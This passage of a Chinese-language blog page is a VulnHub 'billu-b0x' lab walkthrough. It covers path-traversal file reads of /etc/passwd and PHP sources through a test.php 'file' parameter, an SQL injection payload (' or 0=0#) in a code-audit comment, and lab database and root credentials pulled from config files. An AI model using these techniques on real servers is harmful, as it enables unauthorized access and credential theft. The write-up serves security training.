+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>回到目录扫描结果</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706171624866.png" alt="image-20220706171624866"></p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>访问&#x2F;test.php</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706180957428.png" alt="image-20220706180957428"></p>
+<p>页面提示file参数为空 请提供文件路径</p>
+<p>尝试构造test.php?file&#x3D;&#x2F;etc&#x2F;passwd和?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd 返回结果不变</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181243209.png" alt="image-20220706181243209"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181302715.png" alt="image-20220706181302715"></p>
+<p>尝试改变GET请求方式为POST请求方式重新执行后 成功读取了&#x2F;etc&#x2F;passwd文件</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181412320.png" alt="image-20220706181412320"></p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181445598.png" alt="image-20220706181445598"></p>
+<p>再次尝试file参数后能否请求其他类型的值或者文件</p>
+<p>如访问之前的add.php 成功读取到了add.php的源代码</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706181750787.png" alt="image-20220706181750787"></p>
+<p>也就意味着可以利用此漏洞读取目标服务器上的所有文件的源代码</p>
+<p>试着读取主页面文件index.php 成功读取</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706182127346.png" alt="image-20220706182127346"></p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&#x27;login&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=str_replace(&#x27;\&#x27;&#x27;,&#x27;&#x27;,urldecode($_POST[&#x27;un&#x27;]));</span><br><span class="line">	//将用户在客户端以POST方式提交的变量un会进行URL解码并使用str_replace将其中的\&#x27;替换为空再赋值给服务端变量uname</span><br><span class="line">	$pass=str_replace(&#x27;\&#x27;&#x27;,&#x27;&#x27;,urldecode($_POST[&#x27;ps&#x27;]));</span><br><span class="line">	//将用户在客户端以POST方式提交的变量ps会进行URL解码并使用str_replace将其中的\&#x27;替换为空再赋值给服务端变量pass</span><br><span class="line">	$run=&#x27;select * from auth where  pass=\&#x27;&#x27;.$pass.&#x27;\&#x27; and uname=\&#x27;&#x27;.$uname.&#x27;\&#x27;&#x27;;</span><br><span class="line">	//在未做变量过滤，只替换了\&#x27;的情况下，直接将uname和pass两个变量带入执行数据库查询语句（SQL注入漏洞:可构造$run=&#x27;select * from auth where pass=&#x27; &#x27; and uname=&#x27; or 0=0# ）</span><br><span class="line">	$result = mysqli_query($conn, $run);</span><br><span class="line">if (mysqli_num_rows($result) &gt; 0) &#123;</span><br><span class="line"></span><br><span class="line">$row = mysqli_fetch_assoc($result);</span><br><span class="line">	   echo &quot;You are allowed&lt;br&gt;&quot;;</span><br><span class="line">	   $_SESSION[&#x27;logged&#x27;]=true;</span><br><span class="line">	   $_SESSION[&#x27;admin&#x27;]=$row[&#x27;username&#x27;];</span><br><span class="line">	   </span><br><span class="line">	 header(&#x27;Location: panel.php&#x27;, true, 302);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo &quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="配置文件读取"><a href="#配置文件读取" class="headerlink" title="配置文件读取"></a>配置文件读取</h3><p>继续读取c.php发现其是数据库连接配置文件 得到了数据库账号密码库名等信息</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706183914586.png" alt="image-20220706183914586"></p>
+<p>访问之前的目录扫描结果\phpmy\ 发现数据库后台</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184051272.png" alt="image-20220706184051272"></p>
+<p>输入刚才获取到的账号billu密码b0x_billu成功登陆</p>
+<p>在auth表内发现新的一组用户名密码  经验证发现是index.php页面的用户名biLLu密码hEx_it</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220707091928522.png" alt="image-20220707091928522"></p>
+<p>继续对&#x2F;phpmy&#x2F;目录下的文件进行爬取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.108/phpmy/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706184902945.png" alt="image-20220706184902945"></p>
+<p>访问配置文件config.inc.php 发现用户名密码</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185112022.png" alt="image-20220706185112022"></p>
+<p>经验证发现是目标的root用户的账号密码</p>
+<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/13/image-20220706185439437.png" alt="image-20220706185439437"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.3.</span> <span class="toc-text">服务探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.4.</span> <span class="toc-text">访问80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.6.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.8.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">1.9.</span> <span class="toc-text">内核提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">方法二</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.3.</span> <span class="toc-text">配置文件读取</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://byesec.com/posts/db530782.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://byesec.com/posts/db530782.html&text=VulnHub-11-billu-b0x"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://byesec.com/posts/db530782.html&is_video=false&description=VulnHub-11-billu-b0x"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnHub-11-billu-b0x&body=Check out this article: http://byesec.com/posts/db530782.html"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://byesec.com/posts/db530782.html&title=VulnHub-11-billu-b0x"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://byesec.com/posts/db530782.html&name=VulnHub-11-billu-b0x&description=&lt;blockquote&gt;
+&lt;p&gt;靶机：&lt;a href=&#34;https://www.vulnhub.com/entry/billu-b0x,188/&#34;&gt;https://www.vulnhub.com/entry/billu-b0x,188/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;难度：中&lt;/p&gt;
+&lt;p&gt;目标：获取root权限&lt;/p&gt;
+&lt;p&gt;备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）&lt;/p&gt;
+&lt;/blockquote&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://byesec.com/posts/db530782.html&t=VulnHub-11-billu-b0x"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    patrik
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'byesec/blog_utteranc';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
